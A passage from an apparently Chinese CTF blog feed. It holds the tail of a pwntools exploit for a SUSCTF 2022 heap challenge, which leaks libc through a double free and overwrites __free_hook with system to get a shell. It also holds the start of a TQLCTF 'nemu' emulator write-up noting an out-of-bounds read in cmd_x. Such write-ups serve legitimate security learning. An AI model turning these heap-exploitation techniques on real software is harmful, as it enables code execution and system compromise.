payload+=p32(width)</span><br><span class="line">    payload+=p8(front_colour)</span><br><span class="line">    payload+=p8(back_colour)</span><br><span class="line">    payload+=p32(rainfall)</span><br><span class="line">    payload = payload.ljust(<span class="number">18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    <span class="keyword">if</span>(content==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = payload+content</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"><span class="comment"># USE double-free to hijack the rain structure</span></span><br><span class="line">buf = form_buf(<span class="number">0x1</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>) <span class="comment">#0x90</span></span><br><span class="line">config(buf)</span><br><span class="line">buf = form_buf(<span class="number">0x1</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x1</span>) <span class="comment"># free buf</span></span><br><span class="line">config(buf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># a normal buf to call normal rain</span></span><br><span class="line">buf = form_buf(<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x64</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>) <span class="comment"># realloc to 0x58, double free also</span></span><br><span class="line">config(buf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call rain to malloc a new one</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;ch&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment"># debug() # check structure in the double-free chunk</span></span><br><span class="line">payload = p32(<span class="number">0x50</span>)+p32(<span class="number">0x50</span>)+p8(<span class="number">2</span>)+p8(<span class="number">1</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">6</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x400E17</span>)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(<span class="number">0</span>)</span><br><span class="line">buf = form_buf(<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x64</span>,payload) <span class="comment"># important to write zero, because 0x48 chunk need NULL fd</span></span><br><span class="line">config(buf)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">buf2 = form_buf(<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x64</span>,p64(<span class="number">0</span>))</span><br><span class="line">config(buf2)</span><br><span class="line"><span class="comment"># debug() # check get libc</span></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">&quot;Table:            &quot;</span>)</span><br><span class="line">libc_info = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">libc_base = libc_info - <span class="number">0x080a30</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x401B50&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;ch&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>) <span class="comment"># clear</span></span><br><span class="line"><span class="comment"># debug() # check ok</span></span><br><span class="line">buf = form_buf(<span class="number">0x1</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>) <span class="comment">#0x90</span></span><br><span class="line">config(buf) <span class="comment"># add a 0x48 chunk</span></span><br><span class="line">buf = form_buf(<span class="number">0x1</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x1</span>) <span class="comment"># free 0x48 chunk</span></span><br><span class="line">config(buf)</span><br><span class="line">config(buf) <span class="comment"># double free</span></span><br><span class="line">buf = form_buf(<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x64</span>,p64(free_hook-<span class="number">0x8</span>).ljust(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)) </span><br><span class="line">config(buf)</span><br><span class="line"><span class="comment"># debug()  # check free_hook in tcache&#x27;s bk</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x401B50&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;ch&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>) <span class="comment"># clear</span></span><br><span class="line"></span><br><span class="line">buf = form_buf(<span class="number">0x1</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x1</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">config(buf)</span><br><span class="line"><span class="comment"># debug() # check free_hook hijacked</span></span><br><span class="line"></span><br><span class="line">buf = form_buf(<span class="number">0x1</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x1</span>)</span><br><span class="line">config(buf) <span class="comment"># call free</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2022/02/28/SUSCTF2022-pwn/image-20220303234237332.png" alt="image-20220303234237332"></p><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>自己做题的时候有想过rain这个操作能够更新结构体，其实能够更新也就很方便的可以做出来。但是一旦rain终端就崩了，很是苦恼。现在发现<strong>是因为form_buf的时候设置的colour大小出错，本应该是p8,写成了p16。实在是可惜啊。。</strong></p><p>不过也通过这道题学到了一个新的思路：如果程序申请了结构体，可以通过想办法double-free打结构体，使得结构体指针可控。其实kernel条件竞争中存在着这样类似的思路(劫持cred结构体)。</p><p><a href="https://github.com/Nicholas-wei/pwn/tree/main/susctf">题目和附件</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tqlctf-nemu</title>
      <link href="/2022/02/23/tqlctf-nemu/"/>
      <url>/2022/02/23/tqlctf-nemu/</url>
      
        <content type="html"><![CDATA[<p>tqlctf的nemu题目复现。开学了但是被疫情困在寝室，正好可以学习一番。主要基于官方wp。发现虚拟机很好的一点是会给源码。</p><span id="more"></span><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>题目下载及exp</p><p><a href="https://github.com/Nicholas-wei/pwn/tree/main/tqlctf/nemu">https://github.com/Nicholas-wei/pwn/tree/main/tqlctf/nemu</a></p><p>一道给了源码的虚拟机题。先看看有什么保护</p><p><img src="/2022/02/23/tqlctf-nemu/image-20220223213608778.png" alt="image-20220223213608778"></p><p>没有PIE，got表也可写。</p><p>查看虚拟机源码，发现最主要的是这些指令</p><p><img src="/2022/02/23/tqlctf-nemu/image-20220223213701540.png" alt="image-20220223213701540"></p><p>接下来一个一个函数看过来(好像操作系统)</p><h2 id="cmd-help"><a href="#cmd-help" class="headerlink" title="cmd_help"></a>cmd_help</h2><p>根据参数，输出指令对应的用处说明。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_help</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* extract the first argument */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *arg = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>); <span class="comment">// 寻找相应指令</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (arg == <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* no argument given */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CMD; i ++) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s - %s\n&quot;</span>, cmd_table[i].name, cmd_table[i].description);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CMD; i ++) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(arg, cmd_table[i].name) == <span class="number">0</span>) &#123; <span class="comment">// 在cmd_table中寻找到相应内容</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s - %s\n&quot;</span>, cmd_table[i].name, cmd_table[i].description);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Unknown command &#x27;%s&#x27;\n&quot;</span>, arg);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cmd-c"><a href="#cmd-c" class="headerlink" title="cmd_c"></a>cmd_c</h2><p>调用cpu_exec函数。这个函数比较复杂，不分析了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_c</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line"></span><br><span class="line">  cpu_exec(<span class="number">-1</span>); <span class="comment">// 参数为-1表示一直执行</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cmd-si"><a href="#cmd-si" class="headerlink" title="cmd_si"></a>cmd_si</h2><p>其实相当于调用cpu_exec一共n次。</p><h2 id="cmd-info"><a href="#cmd-info" class="headerlink" title="cmd_info"></a>cmd_info</h2><p>可以查看断点以及寄存器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_info</span><span class="params">(<span class="type">char</span> *args)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(args == <span class="literal">NULL</span>) &#123;<span class="built_in">printf</span>(<span class="string">&quot;Please input argument\n&quot;</span>); <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//split string</span></span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *n_str = strtok(args, <span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(n_str,<span class="string">&quot;r&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//print all regeister</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++)&#123;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s:\t%#010x\t&quot;</span>, regsl[i], cpu.gpr[i]._32);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(n_str,<span class="string">&quot;w&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">            list_watchpoint(); <span class="comment">// 查看监视点</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cmd-x"><a href="#cmd-x" class="headerlink" title="cmd_x"></a>cmd_x</h2><p>可以查看内存的值。这里很有意思，可以像gdb一样。不知道gdb是不是也是这样实现的？</p><p>这里注意，x并没有检查需要阅读的地址偏移量是否超出pmem的大小。如果超出可能岛主越界读。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_x</span><span class="params">(<span class="type">char</span> *args)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(args == <span class="literal">NULL</span>)&#123;<span class="built_in">printf</span>(<span class="string">&quot;Please input argument\n&quot;</span>); <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%-10s\t%-10s\t%-10s\n&quot;</span>,<span class="string">&quot;Address&quot;</span>,<span class="string">&quot;DwordBlock&quot;</span>,<span class="string">&quot;DwordBlock&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *n_str = strtok(args, <span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">memcmp</span>(n_str,<span class="string">&quot;0x&quot;</span>,<span class="number">2</span>))&#123; <span class="comment">// 如果是16进制并且只打印这个地址中的数字</span></span><br><span class="line"></span><br><span class="line">       <span class="type">long</span> addr = strtol(n_str,<span class="literal">NULL</span>,<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%#010x\t&quot;</span>,(<span class="type">uint32_t</span>)addr);</span><br><span class="line"></span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%#010x\n&quot;</span>,vaddr_read(addr,<span class="number">4</span>)); </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="comment">// 要打印地址中的多个数字</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> n = atoi(n_str);</span><br><span class="line"></span><br><span class="line">        n_str = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> addr = strtol(n_str,<span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(n)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%#010x\t&quot;</span>,(<span class="type">uint32_t</span>)addr);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=<span class="number">2</span>; i++)&#123;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%#010x\t&quot;</span>,vaddr_read(addr,<span class="number">4</span>)); <span class="comment">// 获取地址中的数据</span></span><br><span class="line"></span><br><span class="line">                addr += <span class="number">4</span>; <span class="comment">// 找到下一个地址</span></span><br><span class="line"></span><br><span class="line">                n--;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意其中的<code>vaddr_read</code>，提供了读取地址中的数值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> <span class="title function_">vaddr_read</span><span class="params">(<span class="type">vaddr_t</span> addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> paddr_read(addr, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">paddr_read</span><span class="params">(<span class="type">paddr_t</span> addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> pmem_rw(addr, <span class="type">uint32_t</span>) &amp; (~<span class="number">0u</span> &gt;&gt; ((<span class="number">4</span> - len) &lt;&lt; <span class="number">3</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pmem_rw(addr, type) *(type *)(&#123;\</span></span><br><span class="line"><span class="meta">    guest_to_host(addr); \</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* convert the guest physical address in the guest program to host virtual address in NEMU */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> guest_to_host(p) ((void *)(pmem + (unsigned)p))</span></span><br></pre></td></tr></table></figure><p>这里的guest就是NEMU中运行的进程的地址。hosu时NEMU。可以看到关键在于<code>pmem_rw</code>中对地址采取了解引用。而地址转换的具体过程就是<code>((void *)(pmem + (unsigned)p))</code>。那么pmem是什么？我们合理猜测他是某个基地址。p就是偏移。向上追溯，p其实是addr，而后面的length似乎只是一个NEMU中地址长度数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PMEM_SIZE (128 * 1024 * 1024)</span></span><br><span class="line"><span class="type">uint8_t</span> pmem[PMEM_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></figure><h2 id="cnd-w"><a href="#cnd-w" class="headerlink" title="cnd_w"></a>cnd_w</h2><p>用来设置watchpoint</p><p>其中watchpoint的数据结构如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">watchpoint</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> NO;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">watchpoint</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* <span class="doctag">TODO:</span> Add more members if necessary */</span></span><br><span class="line"></span><br><span class="line"> <span class="type">char</span> <span class="built_in">exp</span>[<span class="number">30</span>];</span><br><span class="line"></span><br><span class="line"> <span class="type">uint32_t</span> old_val;</span><br><span class="line"></span><br><span class="line"> <span class="type">uint32_t</span> new_val;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; WP;</span><br></pre></td></tr></table></figure><p>以下是设置部分。大致是将WP转换成一个链表结构。其中我们的输入是一个表达式，最后将被算出来数值，放在wp-&gt;old_val中。表达式自身将被放在wp-&gt;exp中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">void set_watchpoint(char *args)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">bool</span> flag = true;</span><br><span class="line"></span><br><span class="line">  uint32_t val = expr(args, &amp;flag);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flag) &#123;</span><br><span class="line"></span><br><span class="line">    printf(<span class="string">&quot;You input an invalid expression, failed to create watchpoint!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line"></span><br><span class="line">  &#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  WP *wp = new_wp();</span><br><span class="line"></span><br><span class="line">  wp-&gt;old_val = val;</span><br><span class="line"></span><br><span class="line">  memcpy(wp-&gt;exp, args, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (head == NULL) &#123;</span><br><span class="line"></span><br><span class="line">    wp-&gt;NO = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    head = wp;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    WP *wwp;</span><br><span class="line"></span><br><span class="line">    wwp = head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (wwp-&gt;<span class="built_in">next</span> != NULL) &#123;</span><br><span class="line"></span><br><span class="line">      wwp = wwp-&gt;<span class="built_in">next</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wp-&gt;NO = wwp-&gt;NO + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    wwp-&gt;<span class="built_in">next</span> = wp;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="cmd-p"><a href="#cmd-p" class="headerlink" title="cmd_p"></a>cmd_p</h2><p>用于打印变量数据，或者计算一些表达式的值。其中调用expr()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> 